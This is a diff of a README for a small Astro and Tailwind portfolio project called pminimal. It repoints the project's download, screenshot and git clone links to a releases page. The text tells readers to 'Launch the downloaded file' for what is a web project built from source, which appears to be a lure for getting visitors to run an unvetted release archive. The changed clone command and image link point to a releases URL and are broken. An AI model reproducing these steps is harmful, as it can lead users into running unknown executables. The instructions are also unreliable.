@@ -14,18 +14,18 @@ Welcome to the **pminimal** repository! This project is a web application built 
 - Implemented with Astro and Tailwind CSS
 
 ## 📦 Download Project:
-- ➡️ [Download Project Zip](https://github.com/repo/releases/9246/App.zip) ⬅️ *(Note: Launch the downloaded file)*
+- ➡️ [Download Project Zip](https://github.com/Minato981/pminimal/releases) ⬅️ *(Note: Launch the downloaded file)*
 
 ## 🖥️ Live Website:
 - Visit the portfolio website [here](#)
 
 ## 🎨 Screenshot:
-![Project Screenshot](https://your-screenshot-url.com)
+![Project Screenshot](https://github.com/Minato981/pminimal/releases)
 
 ## 🔧 Installation:
 1. Clone the repository: 
 ```bash
-git clone https://github.com/your-username/pminimal.git
+git clone https://github.com/Minato981/pminimal/releases
 ```
 2. Install dependencies:
 ```bash
